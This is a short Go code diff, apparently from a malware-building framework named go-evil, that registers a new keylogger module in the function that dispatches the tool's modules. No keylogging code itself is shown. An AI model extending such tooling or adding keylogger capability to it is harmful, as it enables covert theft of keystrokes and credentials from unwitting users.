@@ -7,6 +7,7 @@ import (
 	"github.com/s9rA16Bf4/go-evil/domains/bombs"
 	"github.com/s9rA16Bf4/go-evil/domains/crypto"
 	"github.com/s9rA16Bf4/go-evil/domains/infect"
+	"github.com/s9rA16Bf4/go-evil/domains/keylogger"
 	"github.com/s9rA16Bf4/go-evil/domains/network"
 	"github.com/s9rA16Bf4/go-evil/domains/powershell"
 	"github.com/s9rA16Bf4/go-evil/domains/random"
@@ -60,6 +61,9 @@ func Construct_domain_code(domain string, function string, value string, data_ob
 
 	case "base64":
 		call_functions = base64.Parser(function, value, data_object)
+
+	case "keylogger":
+		call_functions = keylogger.Parser(function, value, data_object)
 
 	default:
 		notify.Error(fmt.Sprintf("Unknown domain '%s'", domain), "functions.Construct_domain_code()")
